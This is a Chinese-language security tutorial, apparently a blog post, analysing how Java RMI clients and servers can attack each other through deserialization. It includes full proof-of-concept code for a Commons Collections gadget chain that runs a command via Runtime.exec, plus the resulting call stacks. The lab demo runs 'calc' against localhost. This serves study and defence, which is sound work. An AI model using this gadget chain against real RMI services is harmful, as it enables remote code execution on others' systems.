## 前言

前文中，我们分析了攻击Registry的两种方式，这里我们接着前面的内容，分析Server和Client的相互攻击方式。

## Attacked

### Server Attacked By Client

首先我们搭建个示例，这里直接注册端和服务端放置在一起。

    
    
    package pers.rmi;
    
    import java.net.MalformedURLException;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    public class RemoteServer {
        public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException {
            LocateRegistry.createRegistry(1099);
            //将需要调用的类进行绑定
            //创建远程类
            RemoteObject remoteObject = new RemoteObject();
            //获取注册中心
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            //绑定类
            registry.bind("test", remoteObject);
        }
    }
    

来看看`RemoteObject`类。

    
    
    package pers.rmi;
    
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    
    //远程可以调用的类，需要继承UnicastRemoteObject类和实现RemoteInterface接口
    
    //也可以指定需要远程调用的类，可以使用UnicastRemoteObject类中的静态方法exportObject指定调用类
    public class RemoteObject extends UnicastRemoteObject implements RemoteInterface {
        protected RemoteObject() throws RemoteException {
            super();
        }
    
        @Override
        public String CaseBegin() {
            return "Hello world!";
        }
    
        @Override
        public String CaseBegin(Object demo) {
            return demo.getClass().getName();
        }
    
        @Override
        public String CaseOver() {
            return "Good bye!";
        }
    }
    

还有一个`RemoteInterface`接口的定义, 需要扩展`Remote`接口。

    
    
    package pers.rmi;
    
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    
    //定义一个能够远程调用的接口，并且需要扩展Remote接口
    public interface RemoteInterface extends Remote {
        public String CaseBegin() throws RemoteException;
        public String CaseBegin(Object demo) throws RemoteException;
        public String CaseOver() throws RemoteException;
    }
    

之后我们在客户端获取远程对象时。

    
    
    // 获取远程对象实例
    Registry registry = LocateRegistry.getRegistry("localhost", 1099);
    RemoteInterface stub = (RemoteInterface) registry.lookup("test");
    System.out.println(stub.CaseBegin(o));
    

我们通过调试，可以知道，我们获取的远程对象`stub`是一个代理对象。

![image-20221011100317924.png](https://image.3001.net/images/20221014/1665759440_634978d011fb9ed5fff42.png!small)

在调用这个远程对象的方法的时候，将会通过`RemoteObjectInvocationHandler#invoke`方法进行调用。

![image-20221011101005800.png](https://image.3001.net/images/20221014/1665759448_634978d8e3ab388f91520.png!small)

将会继续调用`invokeRemoteMethod`方法进行触发。

![image-20221011101406468.png](https://image.3001.net/images/20221014/1665759456_634978e0cb5f1f3cdefff.png!small)

这里的`proxy`对象是一个`Remote`实例，因为前面以后提到了在`RemoteInterface`接口中扩展了`Remote`接口

所以这里调用`ref.invoke`方法，此时的`ref`是`UnicastRef`对象，跟进。

![image-20221011101709182.png](https://image.3001.net/images/20221014/1665759464_634978e84bef97cb8fdf7.png!small)

首先这里建立了一个连接。

![image-20221011102708395.png](https://image.3001.net/images/20221014/1665759472_634978f0d6d74b29bfe4a.png!small)

之后通过`ref`的ID获取对应的远程方法调用，在这里传输数据主要是通过序列化和反序列化的方式进行传输，获取远程方法调用流的输出流对象，在后面通过调用`marshalValue`方法进行数据的传输。

![image-20221011103100651.png](https://image.3001.net/images/20221014/1665759481_634978f97d3a70bff5783.png!small)

根据不同的类型，进行不同的序列化方法的调用，这里的`var1`就是最开始在调用远程方法的时候传入的对象，如果，那里我们传入的是一个恶意的对象，这里将会将其进行序列化传输给服务端。

![image-20221011104030913.png](https://image.3001.net/images/20221014/1665759488_63497900bd56e238aab0f.png!small)

之后就是对获取的服务端发送过来的数据进行反序列化获取，当然我们这里的重点不是这里，之后会提到的，我们这个攻击方式是在向服务端发送序列化数据的时候，服务端的反序列化处理。

![image-20221011105545025.png](https://image.3001.net/images/20221014/1665759495_634979077396ca1e844db.png!small)

首先来到的是服务端的`UnicastServerRef#dispatch`方法，首先获取了输入流，之后调用`readLong`方法获取对应的方法hash值，也就是前面提到的`invokeRemoteMethod`调用过程中，计算的Method
Hash值进行匹配。

![image-20221011105958321.png](https://image.3001.net/images/20221014/1665759504_6349791042cfe8b8c8d7d.png!small)

之后再后面进行反序列化解析。

![image-20221011110125339.png](https://image.3001.net/images/20221014/1665759510_63497916a5a1977e40b4b.png!small)

![image-20221011110402755.png](https://image.3001.net/images/20221014/1665759516_6349791c3661808b8796d.png!small)

将会在这里进行反序列化的调用。

POC

    
    
    package pers.rmi;
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.lang.reflect.*;
    import java.net.MalformedURLException;
    import java.rmi.AlreadyBoundException;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    
    public class RMIClientAttackDemo1 {
        public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, AlreadyBoundException, NoSuchFieldException {
    
            //仿照ysoserial中的写法，防止在本地调试的时候触发命令
            Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
                    new ConstantTransformer(1),
            };
            Transformer transformerChain = new ChainedTransformer(faketransformers);
            Map innerMap = new HashMap();
            Map outMap = LazyMap.decorate(innerMap, transformerChain);
    
            //实例化
            TiedMapEntry tme = new TiedMapEntry(outMap, "key");
            Map expMap = new HashMap();
            //将其作为key键传入
            expMap.put(tme, "value");
    
            //remove
            outMap.remove("key");
    
            //传入利用链
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
    
            Object o = (Object) expMap;
    
            // 获取远程对象实例
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            RemoteInterface stub = (RemoteInterface) registry.lookup("test");
            System.out.println(stub.CaseBegin(o));
        }
    }
    

贴个调用栈。

    
    
    exec:-1, Runtime (java.lang)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:-1, Method (java.lang.reflect)
    transform:125, InvokerTransformer (org.apache.commons.collections.functors)
    transform:122, ChainedTransformer (org.apache.commons.collections.functors)
    get:151, LazyMap (org.apache.commons.collections.map)
    getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
    hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)
    hash:-1, HashMap (java.util)
    readObject:-1, HashMap (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:-1, Method (java.lang.reflect)
    invokeReadObject:-1, ObjectStreamClass (java.io)
    readSerialData:-1, ObjectInputStream (java.io)
    readOrdinaryObject:-1, ObjectInputStream (java.io)
    readObject0:-1, ObjectInputStream (java.io)
    readObject:-1, ObjectInputStream (java.io)
    unmarshalValue:-1, UnicastRef (sun.rmi.server)
    dispatch:-1, UnicastServerRef (sun.rmi.server)
    run:-1, Transport$1 (sun.rmi.transport)
    run:-1, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:-1, Transport (sun.rmi.transport)
    handleMessages:-1, TCPTransport (sun.rmi.transport.tcp)
    run0:-1, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$254:-1, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 1773645219 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1)
    doPrivileged:-1, AccessController (java.security)
    run:-1, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:-1, ThreadPoolExecutor (java.util.concurrent)
    run:-1, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:-1, Thread (java.lang)
    

### Client Attacked By Server

如果你跟进了前面一种攻击方法的利用细节，你会知道主要是通过Client发送序列化数据在客户端进行反序列化，如果仔细阅读了的话在前面也有铺垫。

在`UnicastServerRef#dispatch`方法中在接收客户端的远程调用请求的时候。

![image-20221011114526860.png](https://image.3001.net/images/20221014/1665759527_6349792733e41c3ffeed7.png!small)

在对客户端传入的参数进行反序列化获取之后，在后面将会将其带入`var8.invoke`方法的调用(这里的`var8`是客户端调用的远程方法),这里将会对返回的结果赋值给`var41`变量。

![image-20221011114957832.png](https://image.3001.net/images/20221014/1665759534_6349792eb1b6c042922cf.png!small)

在得到方法调用的结果之后，将会通过调用`marshalValue`方法进行序列化传送给客户端，同样的，在客户端中将会反序列化他，跟进客户端的处理`UnicastRef#invoke`方法。

![image-20221011115245327.png](https://image.3001.net/images/20221014/1665759543_634979373936d07062211.png!small)

通过调用`unmarshalValue`方法进行反序列化，所以我们可以按照这种思路构造POC。

我们同样使用上面提到的`RemoteInterface`接口`RemoteObject`类的代码

只是添加一个`CABS`方法。

    
    
    @Override
    public Object CABS() {
        //仿照ysoserial中的写法，防止在本地调试的时候触发命令
        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformerChain);
    
        //实例化
        TiedMapEntry tme = new TiedMapEntry(outMap, "key");
        Map expMap = new HashMap();
        //将其作为key键传入
        expMap.put(tme, "value");
    
        //remove
        outMap.remove("key");
    
        try {
            //传入利用链
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
        } catch (Exception e) {
            e.printStackTrace();
        }
    
        Object o = (Object) expMap;
    
        return o;
    }
    

构建一个和上面一样的服务端。

之后再客户端连接的时候请求`CABS`方法。

    
    
    package pers.rmi;
    
    import java.net.MalformedURLException;
    import java.rmi.Naming;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    
    public class RMIClient {
        public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException {
            RemoteInterface remoteInterface = (RemoteInterface) Naming.lookup("rmi://127.0.0.1:1099/test");
    //        String s = remoteInterface.CaseBegin();
            Object s = remoteInterface.CABS();
            System.out.println(s);
        }
    }
    

给个调用栈。

    
    
    exec:-1, Runtime (java.lang)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:-1, Method (java.lang.reflect)
    transform:125, InvokerTransformer (org.apache.commons.collections.functors)
    transform:122, ChainedTransformer (org.apache.commons.collections.functors)
    get:151, LazyMap (org.apache.commons.collections.map)
    getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
    hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)
    hash:-1, HashMap (java.util)
    readObject:-1, HashMap (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:-1, Method (java.lang.reflect)
    invokeReadObject:-1, ObjectStreamClass (java.io)
    readSerialData:-1, ObjectInputStream (java.io)
    readOrdinaryObject:-1, ObjectInputStream (java.io)
    readObject0:-1, ObjectInputStream (java.io)
    readObject:-1, ObjectInputStream (java.io)
    unmarshalValue:-1, UnicastRef (sun.rmi.server)
    invoke:-1, UnicastRef (sun.rmi.server)
    invokeRemoteMethod:-1, RemoteObjectInvocationHandler (java.rmi.server)
    invoke:-1, RemoteObjectInvocationHandler (java.rmi.server)
    CABS:-1, $Proxy0 (com.sun.proxy)
    main:12, RMIClient (pers.rmi)
    

## 总结

这里分别分析了从客户端攻击服务端和服务端攻击客户端的攻击方式，两端之间的相互攻击，变相就是一个相互反制的利用。

## Ref

https://www.anquanke.com/post/id/257452

